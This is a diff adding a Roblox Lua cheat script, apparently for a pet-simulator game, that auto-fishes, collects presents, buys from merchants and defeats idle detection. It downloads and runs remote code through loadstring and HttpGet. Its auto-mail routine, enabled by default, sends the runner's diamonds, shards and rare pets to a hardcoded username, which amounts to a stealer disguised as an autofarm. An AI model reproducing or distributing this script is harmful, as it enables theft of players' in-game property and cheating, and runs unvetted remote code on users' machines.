@@ -1,0 +1,217 @@
+getgenv().config = {
+	autoFish = true,
+	autoPresents = true,
+	autoMerchants = true,
+	placetoFish = "AdvancedFishing",
+	invisWater = true,
+
+	userToMail = "DarKuSXzzzz",
+	autoMail = true,
+	sendHuges = true,
+	sendShards = true,
+	sendDiamonds = true,
+	minShards = 100,
+	minDiamonds = 1050000,
+	keepDiamonds = 50000,
+}
+repeat task.wait() until game:IsLoaded()
+local MyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/xnazov/LIBRARY/main/e-Kitty%20Library"))()
+local Players = game:GetService("Players"); local Player = Players.LocalPlayer; local Char = Player.Character; local Hum = Char.Humanoid; local Hrp = Char.HumanoidRootPart
+local Things = game:GetService("Workspace").__THINGS; local Active = Things.__INSTANCE_CONTAINER.Active; local Instances = Things.Instances
+local RepStor = game:GetService("ReplicatedStorage"); local GameLibrary = require(RepStor:WaitForChild("Library")); local Map = game.workspace.Map
+local saveMod = require(RepStor.Library.Client.Save); local saveFile = saveMod.Get(Player); local Network = RepStor:WaitForChild("Network")
+local castRemote = Network.Instancing_FireCustomFromClient; local regCast = (Vector3.new(1171.576 + math.random(-20, 20), 75.914, -3452.577 + math.random(-20, 20)))
+local reelRemote = Network.Instancing_InvokeCustomFromClient; local advCast = (Vector3.new(1487.791 + math.random(-20, 20), 61.355, -4454.075 + math.random(-20, 20)))
+function tp(to) task.wait(math.random(1,20)) if getgenv().config.placetoFish == "Fishing" then Hrp.CFrame = CFrame.new(to.Position + Vector3.new(0,-8,-20), to.LookVector) GameLibrary.Alert.Message("loading surrounding area...") Hrp.Anchored = true; task.wait(3); Hrp.Anchored = false Hrp.CFrame = to task.wait(0.5) Hrp.Anchored = true task.wait(3) Hrp.Anchored = false task.wait(2) elseif getgenv().config.placetoFish == "AdvancedFishing" then Hrp.CFrame = CFrame.new(to.Position + Vector3.new(20,-7.2,0), to.LookVector) local cloudForest = Map:WaitForChild("92 | Cloud Forest") GameLibrary.Alert.Message("loading surrounding area...") Hrp.Anchored = true; task.wait(3); Hrp.Anchored = false Hrp.CFrame = to task.wait(0.5) Hrp.Anchored = true task.wait(3) Hrp.Anchored = false task.wait(2) end end
+function checkArea(areaName) if areaName == "Fishing" then if Active:FindFirstChild("Fishing") then return true end elseif areaName =="AdvancedFishing" then if Active:FindFirstChild("AdvancedFishing") then return true end else warn("failed to find named area") end end
+function spot(areaName) local spot = "" if checkArea(areaName) then if areaName == "Fishing"  then spot = Active["Fishing"].Map.Sign2.Position + Vector3.new(6,0,-18) elseif areaName == "AdvancedFishing" then spot = Active["AdvancedFishing"].Map.Sign2.Position + Vector3.new(72,0,-25) end Hum:MoveTo(spot) Hum.MoveToFinished:Wait() else warn("failed to spot : not check area") end end
+function getPresents() for i,v in pairs(GameLibrary.Save.Get().HiddenPresents) do if not v.Found and v.ID then GameLibrary.Network.Invoke("Hidden Presents: Found", v.ID) end end end
+function getRod() return Player.Character and Player.Character:FindFirstChild("Rod", true) end
+function getLine() return Player.Character and Player.Character:FindFirstChild("FishingLine", true) end
+function getBobba() return Player.Character and Player.Character:FindFirstChild("Bobber", true) end 
+Players.PlayerAdded:Connect(function(new) new.CharacterAdded:Wait() clearPlayers() end); local teleport = Vector3.new(0,0,0)
+local gemstokeep = getgenv().config.keepDiamonds; local minshards = getgenv().config.minShards; local mindiamonds = getgenv().config.minDiamonds
+local vu = game:GetService("VirtualUser"); game.Players.LocalPlayer.PlayerScripts.Scripts.Core["Idle Tracking"].Enabled = false
+game:GetService("Players").LocalPlayer.Idled:connect(function() vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) wait(2) vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame) end)
+
+function autoMail()
+	local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+	local result = saveModule.Get(); local misc = result.Inventory.Misc; local pet = result.Inventory.Pet
+
+	if getgenv().config.sendShards then
+		if Player.leaderstats["💎 Diamonds"].Value > getgenv().config.keepDiamonds then
+			for i, v in pairs(misc) do
+				if v.id == "Magic Shard" then
+					if v._am == nil then
+						continue
+					elseif v._am  > getgenv().config.minShards then
+						Network:FindFirstChild("Mailbox: Send"):InvokeServer(getgenv().config.userToMail, "Magic Shard", "Misc", i, v._am)
+					end
+				end
+			end
+		end
+	end
+
+	if getgenv().config.sendHuges then
+		if Player.leaderstats["💎 Diamonds"].Value > getgenv().config.keepDiamonds then
+			for i, v in pairs(pet) do
+				if v.id == "Huge Poseidon Corgi" then
+					Network:FindFirstChild("Mailbox: Send"):InvokeServer(getgenv().config.userToMail, "Huge Poseidon Corgi", "Pet", i, 1)
+				end
+			end
+		end
+	end
+
+	local GetSave = function()
+		return require(game.ReplicatedStorage.Library.Client.Save).Get()
+	end
+
+	if getgenv().config.sendDiamonds then
+		if Player.leaderstats["💎 Diamonds"].Value > getgenv().config.keepDiamonds then
+			for i, v in pairs(GetSave().Inventory.Currency) do
+				if v.id == "Diamonds" then
+					if v._am > getgenv().config.minDiamonds then
+						local amount = v._am - getgenv().config.keepDiamonds
+						Network:FindFirstChild("Mailbox: Send"):InvokeServer(getgenv().config.userToMail, v.id, "Currency", i, amount)
+					end
+				end
+			end
+		end
+	end
+end
+
+function LeaveArea()
+	if Active:FindFirstChild("Fishing") then
+		Hrp.CFrame = CFrame.new(teleport + Vector3.new(1052.435, 80.236, -3441.187))
+	elseif Active:FindFirstChild("AdvancedFishing") then
+		Hrp.CFrame = CFrame.new(teleport + Vector3.new(1337.605, 63.042, -4443.654))
+	end
+	task.wait(3)
+end
+
+local Fishing = MyLibrary:CreateWindow("Fishing v1.2"); local selectableAreas = {"Fishing", "AdvancedFishing"}; local delayStarted = false; local merchantDelay= 0; local startDelay = 0
+Fishing:Dropdown("area to fish", {flag = 'placetoFish', default = getgenv().config.placetoFish, list = selectableAreas})
+Fishing:Toggle("get presents", {flag = 'getPres', default = getgenv().config.autoPresents})
+Fishing:Toggle("get merchants", {flag = 'getMerch', default = getgenv().config.autoMerchants})
+Fishing:Toggle("auto mail", {flag = 'autoMail', default = getgenv().config.autoMail})
+
+local gettingMerchants = false
+function getMerchants()
+	local currentMinute = os.date("!*t").min
+	if currentMinute == 1 or currentMinute == 31 then
+		gettingMerchants = true
+		task.wait(math.random(1, 30))
+		if Active:FindFirstChild("Fishing") or Active:FindFirstChild("AdvancedFishing") then 
+			LeaveArea() 
+		end
+		if currentMinute == 1 then
+			Hrp.CFrame = CFrame.new(teleport + Vector3.new(370.548, 17.602, 556.301))
+			Hrp.Anchored = true task.wait(2) Hrp.Anchored = false
+			task.wait(2)
+			if Map:FindFirstChild("19 | Oasis") then
+				local num = 1
+				for i = 1,6 do
+					for i = 1,4 do
+						game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer("RegularMerchant",num)
+					end
+					num = num + 1
+				end
+			end
+			task.wait(1)
+			Hrp.CFrame = CFrame.new(teleport + Vector3.new(818.070, 17.604, 1546.617))
+			Hrp.Anchored = true task.wait(2) Hrp.Anchored = false
+			task.wait(2)
+			if Map:FindFirstChild("39 | Ice Rink") then
+				local num = 1
+				for i = 1,6 do
+					for i = 1,4 do
+						game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer("AdvancedMerchant",num)
+					end
+					num = num + 1
+				end
+			end
+		elseif currentMinute == 31 then
+			Hrp.CFrame = CFrame.new(teleport + Vector3.new(370.548, 17.602, 556.301))
+			Hrp.Anchored = true task.wait(3.5) Hrp.Anchored = false
+			if Map:FindFirstChild("19 | Oasis") then
+				local num = 1
+				for i = 1,6 do
+					for i = 1,4 do
+						game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer("RegularMerchant",num)
+					end
+					num = num + 1
+				end
+			end
+		end
+		gettingMerchants = false
+	end
+	local area = Fishing.flags.placetoFish
+	if not checkArea(area) then
+		tp(Instances[area].Teleports.Enter.CFrame)
+	end
+end
+
+Fishing:Toggle("auto fish", {flag = 'autoFish', default = getgenv().config.autoFish}, function()
+	while Fishing.flags.autoFish do
+		repeat task.wait()
+
+			if gettingMerchants then
+				repeat task.wait(1)
+				until not gettingMerchants
+			end
+
+			local area = Fishing.flags.placetoFish
+			if not checkArea(area) then
+				tp(Instances[area].Teleports.Enter.CFrame)
+			end
+
+			Active:WaitForChild(area):WaitForChild("Map"):WaitForChild("Sign2")
+			spot(area)
+
+			local castPos
+			local yPos
+			if area == "Fishing"  then
+				yPos = 75
+				castPos = (Vector3.new(1171.576 + math.random(-20, 20), yPos, -3452.577 + math.random(-20, 20)))
+			elseif area == "AdvancedFishing" then
+				yPos = 61
+				castPos = (Vector3.new(1487.791 + math.random(-20, 20), yPos, -4454.075 + math.random(-20, 20)))
+			end 
+
+			if getLine() == nil then
+				castRemote:FireServer(area, "RequestCast", castPos)
+				task.wait(2.8)
+				castRemote:FireServer(area, "RequestReel")
+			elseif getLine() then
+				while getRod().Parent.Bobber.Transparency > 0 do 
+					reelRemote:InvokeServer(area, "Clicked")
+				end
+			end 
+
+			if Fishing.flags.getPres then
+				getPresents()
+			end
+			if Fishing.flags.autoMail then
+				autoMail()
+			end
+			if Fishing.flags.getMerch then
+				getMerchants()
+			end			
+		until not Fishing.flags.autoFish
+	end
+end)
+
+Fishing:Toggle("invis water", {flag = 'invisWater', default = getgenv().config.invisWater}, function()
+	local area = Fishing.flags.placetoFish
+	local activeArea = Active:WaitForChild(area)
+	if activeArea then
+		for _,v in pairs(activeArea.Water:GetChildren()) do
+			if Fishing.flags.invisWater then
+				v.Transparency = 0.99
+			else
+				v.Transparency = 0.1
+			end
+		end
+	end
+end)
+Fishing:Section("discord.gg/kittyware")
